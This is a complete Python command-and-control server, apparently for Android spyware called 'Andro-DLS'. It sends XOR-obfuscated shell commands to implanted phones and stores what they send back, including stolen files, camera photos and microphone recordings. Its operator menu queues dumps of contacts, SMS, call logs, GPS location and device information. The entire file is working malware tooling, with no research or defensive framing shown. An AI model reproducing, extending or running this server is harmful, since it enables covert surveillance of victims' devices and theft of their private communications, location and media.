#!/usr/bin/env python3
"""
Andro-DLS C2 Server v3 — Interactive command & control with XOR obfuscation
============================================================================
Usage:
    python3 c2_server.py                  # listen on 8080
    python3 c2_server.py --port 9090      # custom port
"""

import http.server
import urllib.parse
import json
import time
import sys
import base64
import os
import threading

HOST = "0.0.0.0"
PORT = 8080
LOG_FILE = "c2_log.json"
CMD_FILE = "/tmp/c2_pending_cmd"
XOR_KEY = b"DLS-2026"

pending_cmd = "NONE"
results_log = []
agents = {}
lock = threading.Lock()

# ── XOR Helpers ────────────────────────────────────────────────
def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def xor_encode(plain: str) -> str:
    return "XOR:" + base64.b64encode(
        xor_bytes(plain.encode("utf-8"), XOR_KEY)
    ).decode()

def xor_decode(b64str: str) -> str:
    """Decode XOR-prefixed base64 string. Returns plain text."""
    if b64str.startswith("XOR:"):
        b64str = b64str[4:]
    raw = base64.b64decode(b64str)
    return xor_bytes(raw, XOR_KEY).decode("utf-8", "replace")

def save_pending():
    with open(CMD_FILE, "w") as f:
        f.write(pending_cmd)

def load_pending():
    global pending_cmd
    try:
        with open(CMD_FILE) as f:
            pending_cmd = f.read().strip()
    except FileNotFoundError:
        pending_cmd = "NONE"

load_pending()

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        if self.path == "/cmd":
            global pending_cmd
            load_pending()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            cmd = pending_cmd
            pending_cmd = "NONE"
            save_pending()
            # XOR-encode outgoing command
            encoded = xor_encode(cmd)
            self.wfile.write(encoded.encode())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        post = self.rfile.read(length).decode("utf-8", "replace")
        parsed = urllib.parse.parse_qs(post)
        raw_data = parsed.get("data", [""])[0]

        # Decode XOR if present
        if raw_data.startswith("XOR:"):
            data = xor_decode(raw_data)
        else:
            data = raw_data

        ts = time.strftime("%H:%M:%S")
        entry = {"timestamp": time.time(), "path": self.path, "data": data[:500]}

        with lock:
            results_log.append(entry)
            if self.path == "/register" and "ID=" in data:
                for line in data.split("\n"):
                    if "=" in line:
                        k, v = line.split("=", 1)
                        if k == "ID":
                            agents[v[:16]] = entry
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")

        # File exfiltration
        if data.startswith("FILE:"):
            handle_file(data)
        elif data.startswith("PHOTO:"):
            handle_photo(data)
        elif data.startswith("AUDIO:"):
            handle_audio(data)

        print(f"\n[+] {ts} ← {self.path}: {data[:150]}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def handle_file(data):
    try:
        _, path, b64 = data.split(":", 2)
        out_dir = os.path.join("exfil", "files")
        os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, os.path.basename(path))
        with open(out_path, "wb") as f:
            f.write(base64.b64decode(b64))
        print(f"[FILE] Saved: {out_path} ({os.path.getsize(out_path)} bytes)")
    except Exception as e:
        print(f"[FILE] Error: {e}")

def handle_photo(data):
    try:
        _, b64 = data.split(":", 1)
        out_dir = os.path.join("exfil", "photos")
        os.makedirs(out_dir, exist_ok=True)
        ts = int(time.time())
        out_path = os.path.join(out_dir, f"cam_{ts}.jpg")
        with open(out_path, "wb") as f:
            f.write(base64.b64decode(b64))
        print(f"[PHOTO] Saved: {out_path} ({os.path.getsize(out_path)} bytes)")
    except Exception as e:
        print(f"[PHOTO] Error: {e}")

def handle_audio(data):
    try:
        _, b64 = data.split(":", 1)
        out_dir = os.path.join("exfil", "audio")
        os.makedirs(out_dir, exist_ok=True)
        ts = int(time.time())
        out_path = os.path.join(out_dir, f"mic_{ts}.3gp")
        with open(out_path, "wb") as f:
            f.write(base64.b64decode(b64))
        print(f"[AUDIO] Saved: {out_path} ({os.path.getsize(out_path)} bytes)")
    except Exception as e:
        print(f"[AUDIO] Error: {e}")

def menu():
    print("""
╔══════════════════════════════════════╗
║      Andro-DLS C2 Server v3.0       ║
╠══════════════════════════════════════╣
║  s      Send shell command          ║
║  ct     Dump contacts               ║
║  sm     Dump SMS (last 50)          ║
║  cl     Dump call log               ║
║  loc    Get GPS location            ║
║  info   Get device info             ║
║  get F  Download file from device   ║
║  cam-f  Capture front camera        ║
║  cam-b  Capture back camera         ║
║  mic N  Record audio N seconds      ║
║  r      View recent results         ║
║  a      List connected agents       ║
║  q      Quit                        ║
╚══════════════════════════════════════╝
""")

def interactive_loop():
    global pending_cmd
    while True:
        try:
            cmd = input("C2> ").strip()
            if not cmd:
                continue
            if cmd == "q":
                print("[*] Shutting down...")
                os._exit(0)
            elif cmd == "r":
                with lock:
                    for r in results_log[-10:]:
                        ts = time.strftime("%H:%M:%S", time.localtime(r['timestamp']))
                        print(f"  {ts} | {r['data'][:200]}")
            elif cmd == "a":
                print(json.dumps(list(agents.keys()), indent=2))
            elif cmd == "s":
                sh_cmd = input("shell> ")
                pending_cmd = "sh:" + sh_cmd
                save_pending()
                print(f"[*] Command queued: {sh_cmd}")
            elif cmd == "ct":
                pending_cmd = "dump:contacts"
                save_pending()
                print("[*] Contacts dump queued")
            elif cmd == "sm":
                pending_cmd = "dump:sms"
                save_pending()
                print("[*] SMS dump queued")
            elif cmd == "cl":
                pending_cmd = "dump:calllog"
                save_pending()
                print("[*] Call log dump queued")
            elif cmd == "loc":
                pending_cmd = "dump:location"
                save_pending()
                print("[*] Location request queued")
            elif cmd == "info":
                pending_cmd = "dump:device"
                save_pending()
                print("[*] Device info request queued")
            elif cmd == "cam-f":
                pending_cmd = "cam:front"
                save_pending()
                print("[*] Front camera capture queued")
            elif cmd == "cam-b":
                pending_cmd = "cam:back"
                save_pending()
                print("[*] Back camera capture queued")
            elif cmd.startswith("mic "):
                secs = cmd[4:].strip()
                pending_cmd = f"mic:{secs}"
                save_pending()
                print(f"[*] Audio recording {secs}s queued")
            elif cmd.startswith("get "):
                path = cmd[4:].strip()
                pending_cmd = f"get:{path}"
                save_pending()
                print(f"[*] File download queued: {path}")
            else:
                pending_cmd = "sh:" + cmd
                save_pending()
                print(f"[*] Queued: {cmd}")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down...")
            os._exit(0)

if __name__ == "__main__":
    if "--port" in sys.argv:
        idx = sys.argv.index("--port")
        PORT = int(sys.argv[idx + 1])

    menu()
    print(f"[*] Listening on {HOST}:{PORT}")
    print(f"[*] XOR obfuscation: {'ENABLED' if XOR_KEY else 'DISABLED'}")

    t = threading.Thread(target=interactive_loop, daemon=True)
    t.start()

    httpd = http.server.HTTPServer((HOST, PORT), C2Handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")